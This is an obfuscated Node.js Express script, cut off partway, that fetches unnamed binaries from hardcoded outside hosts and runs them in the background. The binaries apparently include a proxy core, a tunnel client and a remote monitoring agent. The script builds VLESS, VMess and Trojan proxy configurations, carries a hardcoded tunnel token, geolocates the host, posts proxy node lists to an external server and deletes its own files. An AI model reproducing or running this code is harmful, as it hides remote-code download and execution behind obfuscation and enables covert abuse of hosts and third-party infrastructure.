const _0x4e47a7=_0x1c2f;(function(_0x56297d,_0x4c2678){const _0x202ed6={_0x143b32:0x1ed,_0x404bb7:0x193,_0x1d71dc:0x1ad,_0x4b83bf:0x182,_0x255a16:0x1c0,_0x5f0558:0x211,_0x382ffb:0x197,_0x4b645f:0x1bd,_0x514fc1:0x1bf},_0x45955a=_0x1c2f,_0x522c3e=_0x56297d();while(!![]){try{const _0x1de986=-parseInt(_0x45955a(_0x202ed6._0x143b32))/0x1*(-parseInt(_0x45955a(_0x202ed6._0x404bb7))/0x2)+-parseInt(_0x45955a(0x1cd))/0x3+parseInt(_0x45955a(_0x202ed6._0x1d71dc))/0x4*(parseInt(_0x45955a(_0x202ed6._0x4b83bf))/0x5)+-parseInt(_0x45955a(0x1fb))/0x6*(parseInt(_0x45955a(_0x202ed6._0x255a16))/0x7)+-parseInt(_0x45955a(_0x202ed6._0x5f0558))/0x8+parseInt(_0x45955a(_0x202ed6._0x382ffb))/0x9*(-parseInt(_0x45955a(_0x202ed6._0x4b645f))/0xa)+parseInt(_0x45955a(_0x202ed6._0x514fc1))/0xb;if(_0x1de986===_0x4c2678)break;else _0x522c3e['push'](_0x522c3e['shift']());}catch(_0x5596d3){_0x522c3e['push'](_0x522c3e['shift']());}}}(_0x1e0b,0xef8b7));const express=require('express'),app=express(),axios=require(_0x4e47a7(0x17d)),os=require('os'),fs=require('fs'),path=require(_0x4e47a7(0x187)),{promisify}=require(_0x4e47a7(0x17f)),exec=promisify(require(_0x4e47a7(0x18a))['exec']),{execSync}=require(_0x4e47a7(0x18a)),UPLOAD_URL=process[_0x4e47a7(0x1b9)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x4e47a7(0x1b9)][_0x4e47a7(0x1d3)]||'',AUTO_ACCESS=process[_0x4e47a7(0x1b9)][_0x4e47a7(0x1c1)]||![],FILE_PATH=process['env'][_0x4e47a7(0x1cf)]||_0x4e47a7(0x18f),SUB_PATH=process[_0x4e47a7(0x1b9)][_0x4e47a7(0x1b3)]||_0x4e47a7(0x1f0),PORT=process['env'][_0x4e47a7(0x200)]||process['env'][_0x4e47a7(0x1c8)]||0xbb8,UUID=process['env'][_0x4e47a7(0x216)]||'b5890e2d-8e58-4f81-8c53-d3eec4e886d7',NEZHA_SERVER=process['env'][_0x4e47a7(0x191)]||'',NEZHA_PORT=process[_0x4e47a7(0x1b9)][_0x4e47a7(0x1d0)]||'',NEZHA_KEY=process[_0x4e47a7(0x1b9)][_0x4e47a7(0x1a3)]||'',ARGO_DOMAIN=process[_0x4e47a7(0x1b9)][_0x4e47a7(0x19c)]||_0x4e47a7(0x1f4),ARGO_AUTH=process[_0x4e47a7(0x1b9)]['ARGO_AUTH']||'eyJhIjoiMDc2MDcyZjE3ZWMzY2I1NzFhZTUzYjYwYjVjNjRkZTMiLCJ0IjoiM2U4ZDZhMjYtODliZi00NzdiLThhYzMtM2ZjYTUyNDQ5YzNjIiwicyI6Ill6RTBObUZtWkdZdFpqVmtaUzAwTURNd0xXRXpNV0l0TURFek9XRm1aR0k0TVRobCJ9',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x4e47a7(0x1b9)]['CFIP']||_0x4e47a7(0x173),CFPORT=process[_0x4e47a7(0x1b9)][_0x4e47a7(0x1b8)]||0x1bb,NAME=process[_0x4e47a7(0x1b9)][_0x4e47a7(0x1f1)]||_0x4e47a7(0x1e4);!fs['existsSync'](FILE_PATH)?(fs[_0x4e47a7(0x1a8)](FILE_PATH),console[_0x4e47a7(0x1a1)](FILE_PATH+_0x4e47a7(0x1ff))):console['log'](FILE_PATH+_0x4e47a7(0x185));function generateRandomName(){const _0x4eca8f={_0x4ec0d6:0x17b},_0x40905b=_0x4e47a7,_0x57608f=_0x40905b(_0x4eca8f._0x4ec0d6);let _0x531218='';for(let _0x1e6dc6=0x0;_0x1e6dc6<0x6;_0x1e6dc6++){_0x531218+=_0x57608f[_0x40905b(0x1e7)](Math[_0x40905b(0x1db)](Math[_0x40905b(0x209)]()*_0x57608f[_0x40905b(0x207)]));}return _0x531218;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x4e47a7(0x183)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x4e47a7(0x183)](FILE_PATH,botName),subPath=path[_0x4e47a7(0x183)](FILE_PATH,_0x4e47a7(0x20c)),listPath=path['join'](FILE_PATH,_0x4e47a7(0x1b7)),bootLogPath=path[_0x4e47a7(0x183)](FILE_PATH,_0x4e47a7(0x1f3)),configPath=path[_0x4e47a7(0x183)](FILE_PATH,_0x4e47a7(0x19f));function deleteNodes(){const _0x3d7dcd={_0x788ea6:0x1f6,_0x12a068:0x218,_0x146ea2:0x1f2,_0x2fb9ed:0x227,_0x592c69:0x189,_0x5b801d:0x207,_0x4da285:0x1ca},_0x1134dc=_0x4e47a7;try{if(!UPLOAD_URL)return;if(!fs[_0x1134dc(0x16f)](subPath))return;let _0x2062f1;try{_0x2062f1=fs['readFileSync'](subPath,_0x1134dc(_0x3d7dcd._0x788ea6));}catch{return null;}const _0x254f9c=Buffer[_0x1134dc(_0x3d7dcd._0x12a068)](_0x2062f1,_0x1134dc(_0x3d7dcd._0x146ea2))[_0x1134dc(0x1a5)](_0x1134dc(_0x3d7dcd._0x788ea6)),_0x2822d9=_0x254f9c[_0x1134dc(_0x3d7dcd._0x2fb9ed)]('\x0a')[_0x1134dc(_0x3d7dcd._0x592c69)](_0x45b5b0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1134dc(0x1c5)](_0x45b5b0));if(_0x2822d9[_0x1134dc(_0x3d7dcd._0x5b801d)]===0x0)return;return axios[_0x1134dc(0x174)](UPLOAD_URL+_0x1134dc(_0x3d7dcd._0x4da285),JSON['stringify']({'nodes':_0x2822d9}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x1e14ff=>{return null;}),null;}catch(_0x2da313){return null;}}function cleanupOldFiles(){const _0x1b6740={_0xec201f:0x183};try{const _0xb88975=fs['readdirSync'](FILE_PATH);_0xb88975['forEach'](_0x49b23f=>{const _0x294e0a=_0x1c2f,_0x4cf739=path[_0x294e0a(_0x1b6740._0xec201f)](FILE_PATH,_0x49b23f);try{const _0x492ca1=fs[_0x294e0a(0x232)](_0x4cf739);_0x492ca1[_0x294e0a(0x1e8)]()&&fs['unlinkSync'](_0x4cf739);}catch(_0x215887){}});}catch(_0x1404b9){}}app[_0x4e47a7(0x1da)]('/',function(_0xff746d,_0x1bddd3){const _0x3d9015={_0x5f440d:0x199},_0x5bda8b=_0x4e47a7;_0x1bddd3['send'](_0x5bda8b(_0x3d9015._0x5f440d));});async function generateConfig(){const _0x1570cb={_0x3cf275:0x205,_0x18ac2f:0x20b,_0x23dc4c:0x220,_0x455d6b:0x201,_0x410830:0x20d,_0x24ea17:0x220,_0x44947d:0x1e2,_0x110e65:0x206,_0x34a794:0x228,_0x164f24:0x221,_0x2f7b89:0x1d9},_0x5129aa=_0x4e47a7,_0x4f0b19={'log':{'access':_0x5129aa(0x172),'error':_0x5129aa(0x172),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5129aa(_0x1570cb._0x3cf275),'settings':{'clients':[{'id':UUID,'flow':_0x5129aa(_0x1570cb._0x18ac2f)}],'decryption':_0x5129aa(0x20d),'fallbacks':[{'dest':0xbb9},{'path':_0x5129aa(_0x1570cb._0x23dc4c),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x5129aa(_0x1570cb._0x455d6b)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x5129aa(0x205),'settings':{'clients':[{'id':UUID}],'decryption':_0x5129aa(_0x1570cb._0x410830)},'streamSettings':{'network':_0x5129aa(0x201),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5129aa(0x205),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5129aa(0x20d)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5129aa(_0x1570cb._0x24ea17)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5129aa(0x1d5),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x5129aa(0x22e),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5129aa(0x225)}},'sniffing':{'enabled':!![],'destOverride':[_0x5129aa(_0x1570cb._0x44947d),'tls',_0x5129aa(0x170)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5129aa(0x19b),'protocol':_0x5129aa(_0x1570cb._0x110e65),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5129aa(_0x1570cb._0x44947d),_0x5129aa(0x1d5),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x5129aa(_0x1570cb._0x34a794)]},'outbounds':[{'protocol':_0x5129aa(0x21b),'tag':_0x5129aa(_0x1570cb._0x164f24)},{'protocol':_0x5129aa(0x186),'tag':_0x5129aa(0x1ea)}]};fs[_0x5129aa(0x1d1)](path['join'](FILE_PATH,'config.json'),JSON[_0x5129aa(_0x1570cb._0x2f7b89)](_0x4f0b19,null,0x2));}function getSystemArchitecture(){const _0x360b94=_0x4e47a7,_0x227d52=os['arch']();return _0x227d52===_0x360b94(0x1d8)||_0x227d52==='arm64'||_0x227d52==='aarch64'?_0x360b94(0x1d8):_0x360b94(0x179);}function downloadFile(_0x1250ad,_0x480127,_0xd55eca){const _0x2197af={_0x145cae:0x1c3,_0x518d2b:0x1da,_0xcfc035:0x1e0},_0x1a0356={_0x27bf3e:0x190,_0x6ff774:0x1e3,_0xf511d9:0x1de,_0x3487f7:0x192},_0x2cc613={_0x525237:0x1e1},_0x1fb431={_0x414ffc:0x19e,_0x12d5d5:0x1e3,_0x5e8389:0x1de},_0x4a26aa=_0x4e47a7,_0x425340=_0x1250ad;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x4967dc=fs[_0x4a26aa(_0x2197af._0x145cae)](_0x425340);axios({'method':_0x4a26aa(_0x2197af._0x518d2b),'url':_0x480127,'responseType':_0x4a26aa(_0x2197af._0xcfc035)})[_0x4a26aa(0x1dd)](_0x1b911a=>{const _0x204786=_0x4a26aa;_0x1b911a[_0x204786(_0x2cc613._0x525237)][_0x204786(0x1dc)](_0x4967dc),_0x4967dc['on']('finish',()=>{const _0x19227b=_0x204786;_0x4967dc[_0x19227b(0x204)](),console['log']('Download\x20'+path[_0x19227b(0x190)](_0x425340)+_0x19227b(0x171)),_0xd55eca(null,_0x425340);}),_0x4967dc['on']('error',_0x1a49d1=>{const _0xa56188=_0x204786;fs[_0xa56188(0x1f9)](_0x425340,()=>{});const _0x1a295f=_0xa56188(_0x1fb431._0x414ffc)+path['basename'](_0x425340)+_0xa56188(_0x1fb431._0x12d5d5)+_0x1a49d1[_0xa56188(_0x1fb431._0x5e8389)];console[_0xa56188(0x192)](_0x1a295f),_0xd55eca(_0x1a295f);});})[_0x4a26aa(0x231)](_0x4096de=>{const _0x4fa99c=_0x4a26aa,_0x4649d9=_0x4fa99c(0x19e)+path[_0x4fa99c(_0x1a0356._0x27bf3e)](_0x425340)+_0x4fa99c(_0x1a0356._0x6ff774)+_0x4096de[_0x4fa99c(_0x1a0356._0xf511d9)];console[_0x4fa99c(_0x1a0356._0x3487f7)](_0x4649d9),_0xd55eca(_0x4649d9);});}async function downloadFilesAndRun(){const _0xcf36e9={_0x386e4e:0x207,_0x3950ff:0x22f,_0x17ddee:0x192,_0x390674:0x22c,_0x16ceec:0x1e6,_0x4dc25a:0x20f,_0x1c7a79:0x1df,_0x489afe:0x1d2,_0x24be10:0x219,_0x4fbdd7:0x21c,_0x47448c:0x21d,_0x59a4d8:0x1a1,_0x5edd9e:0x175,_0x2b877e:0x1a6,_0x5cd5f8:0x1c6,_0x37426a:0x1df,_0xdd053a:0x18d,_0x18dc4a:0x1e9,_0x21987b:0x194,_0x501ec7:0x1b2,_0x5b0185:0x214,_0x510337:0x1ae,_0x166cbc:0x21a,_0x43f14d:0x1a9,_0x32827f:0x233,_0x275a6f:0x1e9},_0x355956=_0x4e47a7,_0x46f00d=getSystemArchitecture(),_0x55dbe4=getFilesForArchitecture(_0x46f00d);if(_0x55dbe4[_0x355956(_0xcf36e9._0x386e4e)]===0x0){console['log'](_0x355956(_0xcf36e9._0x3950ff));return;}const _0x36c18f=_0x55dbe4[_0x355956(0x1a0)](_0x2046e9=>{return new Promise((_0x26312f,_0x360060)=>{downloadFile(_0x2046e9['fileName'],_0x2046e9['fileUrl'],(_0xf95b9,_0x4f5b6d)=>{_0xf95b9?_0x360060(_0xf95b9):_0x26312f(_0x4f5b6d);});});});try{await Promise[_0x355956(0x212)](_0x36c18f);}catch(_0x1e6d60){console[_0x355956(_0xcf36e9._0x17ddee)](_0x355956(_0xcf36e9._0x390674),_0x1e6d60);return;}function _0x2e1165(_0x3bda2b){const _0x487ff8={_0xcaacdd:0x230},_0x19b446=_0x355956,_0x3cf008=0x1fd;_0x3bda2b[_0x19b446(0x188)](_0x5e357b=>{const _0x17477e={_0x5160f2:0x1d4,_0x36db83:0x1a1,_0x3c3b55:0x1a5},_0xf6fd43=_0x19b446;fs[_0xf6fd43(0x16f)](_0x5e357b)&&fs[_0xf6fd43(_0x487ff8._0xcaacdd)](_0x5e357b,_0x3cf008,_0x19743c=>{const _0xf65475=_0xf6fd43;_0x19743c?console[_0xf65475(0x192)](_0xf65475(_0x17477e._0x5160f2)+_0x5e357b+':\x20'+_0x19743c):console[_0xf65475(_0x17477e._0x36db83)]('Empowerment\x20success\x20for\x20'+_0x5e357b+':\x20'+_0x3cf008[_0xf65475(_0x17477e._0x3c3b55)](0x8));});});}const _0x3f8384=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2e1165(_0x3f8384);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x229f6e=NEZHA_SERVER[_0x355956(_0xcf36e9._0x16ceec)](':')?NEZHA_SERVER['split'](':')[_0x355956(_0xcf36e9._0x4dc25a)]():'',_0x3d8f08=new Set([_0x355956(0x1f8),_0x355956(0x1c6),_0x355956(_0xcf36e9._0x1c7a79),_0x355956(_0xcf36e9._0x489afe),'2083',_0x355956(_0xcf36e9._0x24be10)]),_0x553946=_0x3d8f08[_0x355956(0x198)](_0x229f6e)?_0x355956(0x1fa):_0x355956(0x1a7),_0x1b8db4=_0x355956(0x208)+NEZHA_KEY+_0x355956(0x1b0)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x553946+_0x355956(_0xcf36e9._0x4fbdd7)+UUID;fs[_0x355956(0x1d1)](path[_0x355956(0x183)](FILE_PATH,_0x355956(_0xcf36e9._0x47448c)),_0x1b8db4);const _0x327bc4='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x355956(0x1eb);try{await exec(_0x327bc4),console[_0x355956(_0xcf36e9._0x59a4d8)](phpName+_0x355956(_0xcf36e9._0x5edd9e)),await new Promise(_0x1147e3=>setTimeout(_0x1147e3,0x3e8));}catch(_0x403124){console[_0x355956(0x192)](_0x355956(_0xcf36e9._0x2b877e)+_0x403124);}}else{let _0x1be11a='';const _0x123e71=[_0x355956(0x1f8),_0x355956(_0xcf36e9._0x5cd5f8),_0x355956(_0xcf36e9._0x37426a),_0x355956(0x1d2),_0x355956(0x19d),_0x355956(_0xcf36e9._0x24be10)];_0x123e71[_0x355956(_0xcf36e9._0x16ceec)](NEZHA_PORT)&&(_0x1be11a=_0x355956(_0xcf36e9._0xdd053a));const _0x4f5196=_0x355956(_0xcf36e9._0x18dc4a)+npmPath+_0x355956(0x222)+NEZHA_SERVER+':'+NEZHA_PORT+_0x355956(_0xcf36e9._0x21987b)+NEZHA_KEY+'\x20'+_0x1be11a+_0x355956(_0xcf36e9._0x501ec7);try{await exec(_0x4f5196),console[_0x355956(0x1a1)](npmName+_0x355956(0x175)),await new Promise(_0x2282fc=>setTimeout(_0x2282fc,0x3e8));}catch(_0x8401b1){console[_0x355956(0x192)](_0x355956(_0xcf36e9._0x5b0185)+_0x8401b1);}}}else console[_0x355956(0x1a1)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x48a2c7='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x355956(_0xcf36e9._0x510337);try{await exec(_0x48a2c7),console[_0x355956(0x1a1)](webName+_0x355956(_0xcf36e9._0x5edd9e)),await new Promise(_0x164b0a=>setTimeout(_0x164b0a,0x3e8));}catch(_0x58c2d6){console[_0x355956(_0xcf36e9._0x17ddee)]('web\x20running\x20error:\x20'+_0x58c2d6);}if(fs[_0x355956(0x16f)](botPath)){let _0x26e33b;if(ARGO_AUTH[_0x355956(0x210)](/^[A-Z0-9a-z=]{120,250}$/))_0x26e33b=_0x355956(_0xcf36e9._0x166cbc)+ARGO_AUTH;else ARGO_AUTH[_0x355956(0x210)](/TunnelSecret/)?_0x26e33b=_0x355956(_0xcf36e9._0x43f14d)+FILE_PATH+_0x355956(_0xcf36e9._0x32827f):_0x26e33b=_0x355956(0x1e5)+FILE_PATH+_0x355956(0x1b5)+ARGO_PORT;try{await exec(_0x355956(_0xcf36e9._0x275a6f)+botPath+'\x20'+_0x26e33b+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x6d4bdf=>setTimeout(_0x6d4bdf,0x7d0));}catch(_0x2e2d4b){console[_0x355956(_0xcf36e9._0x17ddee)](_0x355956(0x17c)+_0x2e2d4b);}}await new Promise(_0x1d932b=>setTimeout(_0x1d932b,0x1388));}function getFilesForArchitecture(_0x3d1d27){const _0x40ab62={_0x10385f:0x1ee,_0x577611:0x22d,_0x3c3df0:0x1d8,_0x3b0d19:0x22d},_0x56de46=_0x4e47a7;let _0x3df4e6;_0x3d1d27==='arm'?_0x3df4e6=[{'fileName':webPath,'fileUrl':_0x56de46(0x1ec)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x3df4e6=[{'fileName':webPath,'fileUrl':_0x56de46(0x215)},{'fileName':botPath,'fileUrl':_0x56de46(_0x40ab62._0x10385f)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xb16652=_0x3d1d27===_0x56de46(0x1d8)?_0x56de46(0x17e):_0x56de46(0x18e);_0x3df4e6[_0x56de46(_0x40ab62._0x577611)]({'fileName':npmPath,'fileUrl':_0xb16652});}else{const _0x37a769=_0x3d1d27===_0x56de46(_0x40ab62._0x3c3df0)?_0x56de46(0x22b):_0x56de46(0x1c2);_0x3df4e6[_0x56de46(_0x40ab62._0x3b0d19)]({'fileName':phpPath,'fileUrl':_0x37a769});}}return _0x3df4e6;}function argoType(){const _0x5a412d={_0x9818a2:0x20e,_0x5395fb:0x1e6,_0x4b5b31:0x1af,_0x2322fa:0x183,_0x3a061e:0x1aa,_0x46591f:0x1aa,_0xc5cf9b:0x1bb,_0x4a5525:0x1d1},_0x17d956=_0x4e47a7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x17d956(0x1a1)](_0x17d956(_0x5a412d._0x9818a2));return;}if(ARGO_AUTH[_0x17d956(_0x5a412d._0x5395fb)](_0x17d956(_0x5a412d._0x4b5b31))){fs[_0x17d956(0x1d1)](path[_0x17d956(_0x5a412d._0x2322fa)](FILE_PATH,_0x17d956(_0x5a412d._0x3a061e)),ARGO_AUTH);const _0x50be47='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x17d956(0x181)+path[_0x17d956(0x183)](FILE_PATH,_0x17d956(_0x5a412d._0x46591f))+_0x17d956(0x1f7)+ARGO_DOMAIN+_0x17d956(_0x5a412d._0xc5cf9b)+ARGO_PORT+_0x17d956(0x1ac);fs[_0x17d956(_0x5a412d._0x4a5525)](path['join'](FILE_PATH,_0x17d956(0x1b1)),_0x50be47);}else console[_0x17d956(0x1a1)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x3292f7={_0x42fa83:0x1a1,_0x33a03a:0x183,_0x4317f8:0x227,_0xe3f587:0x1a1,_0x35245a:0x1cc,_0x21a863:0x1e5,_0x4364d5:0x1e9,_0x1fa85f:0x175,_0x1d91b7:0x17c},_0x3ffcb0={_0x41e53f:0x1e1,_0x51f981:0x1e1,_0x57b7d0:0x1ab,_0x2c7338:0x1e1,_0x4270e8:0x1ef,_0x3c1127:0x1e1,_0x54d326:0x1d6},_0x27d9dc={_0x30884e:0x1c7,_0x5b72e5:0x1e7,_0x51f28e:0x18b},_0x348385={_0x32ef3:0x1c4},_0x54d30b=_0x4e47a7;let _0x231005;if(ARGO_AUTH&&ARGO_DOMAIN)_0x231005=ARGO_DOMAIN,console[_0x54d30b(_0x3292f7._0x42fa83)](_0x54d30b(0x196),_0x231005),await _0x3d4632(_0x231005);else try{const _0x48ee0c=fs['readFileSync'](path[_0x54d30b(_0x3292f7._0x33a03a)](FILE_PATH,_0x54d30b(0x1f3)),'utf-8'),_0x4351e1=_0x48ee0c[_0x54d30b(_0x3292f7._0x4317f8)]('\x0a'),_0x4a5ea3=[];_0x4351e1[_0x54d30b(0x188)](_0xf732be=>{const _0x4f2557=_0x54d30b,_0x58e26f=_0xf732be['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x58e26f){const _0x1a8175=_0x58e26f[0x1];_0x4a5ea3[_0x4f2557(_0x348385._0x32ef3)](_0x1a8175);}});if(_0x4a5ea3[_0x54d30b(0x207)]>0x0)_0x231005=_0x4a5ea3[0x0],console[_0x54d30b(0x1a1)]('ArgoDomain:',_0x231005),await _0x3d4632(_0x231005);else{console[_0x54d30b(_0x3292f7._0xe3f587)](_0x54d30b(_0x3292f7._0x35245a)),fs['unlinkSync'](path[_0x54d30b(0x183)](FILE_PATH,_0x54d30b(0x1f3)));async function _0x404490(){const _0xb5da66=_0x54d30b;try{process['platform']===_0xb5da66(0x1be)?await exec(_0xb5da66(0x229)+botName+_0xb5da66(_0x27d9dc._0x30884e)):await exec(_0xb5da66(0x1fd)+botName[_0xb5da66(_0x27d9dc._0x5b72e5)](0x0)+']'+botName[_0xb5da66(0x226)](0x1)+_0xb5da66(_0x27d9dc._0x51f28e));}catch(_0x543bcf){}}_0x404490(),await new Promise(_0x1a820f=>setTimeout(_0x1a820f,0xbb8));const _0x39f581=_0x54d30b(_0x3292f7._0x21a863)+FILE_PATH+_0x54d30b(0x1b5)+ARGO_PORT;try{await exec(_0x54d30b(_0x3292f7._0x4364d5)+botPath+'\x20'+_0x39f581+_0x54d30b(0x180)),console[_0x54d30b(0x1a1)](botName+_0x54d30b(_0x3292f7._0x1fa85f)),await new Promise(_0x169bae=>setTimeout(_0x169bae,0xbb8)),await extractDomains();}catch(_0x4172c1){console['error'](_0x54d30b(_0x3292f7._0x1d91b7)+_0x4172c1);}}}catch(_0x4fa990){console[_0x54d30b(0x192)]('Error\x20reading\x20boot.log:',_0x4fa990);}async function _0x3b6cf0(){const _0x3c58a7=_0x54d30b;try{const _0x1815d4=await axios['get'](_0x3c58a7(0x203),{'timeout':0xbb8});if(_0x1815d4[_0x3c58a7(0x1e1)]&&_0x1815d4[_0x3c58a7(0x1e1)]['country_code']&&_0x1815d4[_0x3c58a7(_0x3ffcb0._0x41e53f)][_0x3c58a7(0x1d6)])return _0x1815d4[_0x3c58a7(_0x3ffcb0._0x41e53f)][_0x3c58a7(0x1d7)]+'_'+_0x1815d4[_0x3c58a7(0x1e1)][_0x3c58a7(0x1d6)];}catch(_0x53f58b){try{const _0x41c484=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x41c484[_0x3c58a7(_0x3ffcb0._0x41e53f)]&&_0x41c484[_0x3c58a7(_0x3ffcb0._0x51f981)][_0x3c58a7(_0x3ffcb0._0x57b7d0)]==='success'&&_0x41c484[_0x3c58a7(_0x3ffcb0._0x2c7338)][_0x3c58a7(_0x3ffcb0._0x4270e8)]&&_0x41c484[_0x3c58a7(_0x3ffcb0._0x3c1127)][_0x3c58a7(0x1d6)])return _0x41c484[_0x3c58a7(_0x3ffcb0._0x51f981)][_0x3c58a7(_0x3ffcb0._0x4270e8)]+'_'+_0x41c484['data'][_0x3c58a7(_0x3ffcb0._0x54d326)];}catch(_0xc7c3a9){}}return _0x3c58a7(0x19a);}async function _0x3d4632(_0x2a5fc6){const _0x12294e=await _0x3b6cf0(),_0x16853a=NAME?NAME+'-'+_0x12294e:_0x12294e;return new Promise(_0x38df71=>{const _0x4541bd={_0x5002c4:0x20d,_0x22600b:0x1d5,_0x15a46d:0x17a,_0x17f368:0x224,_0x223b1f:0x21f,_0x2ab1a3:0x21e,_0x59e41a:0x218,_0x3ec82c:0x1d9,_0x3ac225:0x1a5,_0xb3cae3:0x1b4,_0x45a3de:0x176,_0x2f303c:0x21f,_0x206ff6:0x1f2,_0x450832:0x1d1},_0x53ea40={_0x427e48:0x1a5,_0x59037c:0x1f2,_0x24fb08:0x1f5};setTimeout(()=>{const _0x30b01b=_0x1c2f,_0x5830d6={'v':'2','ps':''+_0x16853a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x30b01b(_0x4541bd._0x5002c4),'net':'ws','type':_0x30b01b(_0x4541bd._0x5002c4),'host':_0x2a5fc6,'path':'/vmess-argo?ed=2560','tls':_0x30b01b(_0x4541bd._0x22600b),'sni':_0x2a5fc6,'alpn':'','fp':_0x30b01b(_0x4541bd._0x15a46d)},_0x5bfa49='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x30b01b(_0x4541bd._0x17f368)+_0x2a5fc6+_0x30b01b(_0x4541bd._0x223b1f)+_0x2a5fc6+_0x30b01b(0x178)+_0x16853a+_0x30b01b(_0x4541bd._0x2ab1a3)+Buffer[_0x30b01b(_0x4541bd._0x59e41a)](JSON[_0x30b01b(_0x4541bd._0x3ec82c)](_0x5830d6))[_0x30b01b(_0x4541bd._0x3ac225)](_0x30b01b(0x1f2))+_0x30b01b(_0x4541bd._0xb3cae3)+UUID+'@'+CFIP+':'+CFPORT+_0x30b01b(_0x4541bd._0x45a3de)+_0x2a5fc6+_0x30b01b(_0x4541bd._0x2f303c)+_0x2a5fc6+_0x30b01b(0x1cb)+_0x16853a+'\x0a\x20\x20\x20\x20';console[_0x30b01b(0x1a1)](Buffer[_0x30b01b(_0x4541bd._0x59e41a)](_0x5bfa49)[_0x30b01b(_0x4541bd._0x3ac225)](_0x30b01b(_0x4541bd._0x206ff6))),fs[_0x30b01b(_0x4541bd._0x450832)](subPath,Buffer[_0x30b01b(_0x4541bd._0x59e41a)](_0x5bfa49)[_0x30b01b(_0x4541bd._0x3ac225)](_0x30b01b(0x1f2))),console[_0x30b01b(0x1a1)](FILE_PATH+_0x30b01b(0x195)),uploadNodes(),app[_0x30b01b(0x1da)]('/'+SUB_PATH,(_0x1e57f2,_0x2f6a42)=>{const _0x564d32=_0x30b01b,_0x4bae8d=Buffer['from'](_0x5bfa49)[_0x564d32(_0x53ea40._0x427e48)](_0x564d32(_0x53ea40._0x59037c));_0x2f6a42['set'](_0x564d32(0x177),_0x564d32(_0x53ea40._0x24fb08)),_0x2f6a42['send'](_0x4bae8d);}),_0x38df71(_0x5bfa49);},0x7d0);});}}async function uploadNodes(){const _0x8891fd={_0x1583fc:0x174,_0x1e55b5:0x1ce,_0x20f121:0x189},_0x2e8c94=_0x4e47a7;if(UPLOAD_URL&&PROJECT_URL){const _0x4c46aa=PROJECT_URL+'/'+SUB_PATH,_0x18048e={'subscription':[_0x4c46aa]};try{const _0x1f2161=await axios[_0x2e8c94(_0x8891fd._0x1583fc)](UPLOAD_URL+'/api/add-subscriptions',_0x18048e,{'headers':{'Content-Type':'application/json'}});return _0x1f2161&&_0x1f2161['status']===0xc8?(console[_0x2e8c94(0x1a1)](_0x2e8c94(0x1fc)),_0x1f2161):null;}catch(_0xd33bb0){if(_0xd33bb0['response']){if(_0xd33bb0[_0x2e8c94(0x20a)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x389bb4=fs[_0x2e8c94(_0x8891fd._0x1e55b5)](listPath,'utf-8'),_0x4d836e=_0x389bb4[_0x2e8c94(0x227)]('\x0a')[_0x2e8c94(_0x8891fd._0x20f121)](_0x5a4a42=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5a4a42));if(_0x4d836e['length']===0x0)return;const _0x17a5e9=JSON[_0x2e8c94(0x1d9)]({'nodes':_0x4d836e});try{const _0x6bfd6b=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x17a5e9,{'headers':{'Content-Type':_0x2e8c94(0x213)}});return _0x6bfd6b&&_0x6bfd6b[_0x2e8c94(0x1ab)]===0xc8?(console[_0x2e8c94(0x1a1)]('Nodes\x20uploaded\x20successfully'),_0x6bfd6b):null;}catch(_0xd7265f){return null;}}else return;}}function cleanFiles(){const _0x5ef4dd={_0x5b9e18:0x22a,_0x596ef4:0x1be,_0x44eaac:0x1a2},_0xe619dc={_0x1722c0:0x1fe,_0x20c82d:0x1a1,_0x114e76:0x202},_0x514c00={_0x5c60f1:0x1a1,_0x336543:0x1a1,_0x159475:0x202};setTimeout(()=>{const 